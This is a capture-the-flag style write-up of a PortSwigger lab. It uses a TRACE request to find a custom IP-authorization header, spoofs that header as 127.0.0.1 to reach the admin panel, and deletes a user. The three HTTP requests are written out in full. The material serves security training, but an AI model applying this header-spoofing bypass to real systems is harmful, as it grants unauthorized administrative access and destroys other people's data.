# Authentication bypass via information disclosure

**Lab Url**: [https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)

## Objective

This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

The login page responds to the `TRACE` HTTP method, which echoes back the request headers along with any headers added by intermediate servers. This reveals a custom header used for IP-based access control.

### Step 1: Discover the custom header

Send a `TRACE` request to `/login`:

```bash
TRACE /login HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

The response echoes the request headers back, including an additional header injected by the front-end:

```bash
X-Custom-IP-Authorization: 27.60.140.204
```

This header is used by the back-end for IP-based authorization.

### Step 2: Access the admin panel

The admin interface is at `/admin`. Without the custom header, it returns **401 Unauthorized**.

Re-send the request with the discovered header, setting the IP to `127.0.0.1` to impersonate localhost:

```bash
GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
```

The admin panel loads successfully.

### Step 3: Delete user carlos

Find the endpoint to delete `carlos` from the admin panel and send the request with the same header:

```bash
GET /admin/delete?username=carlos HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
```

The lab is solved.
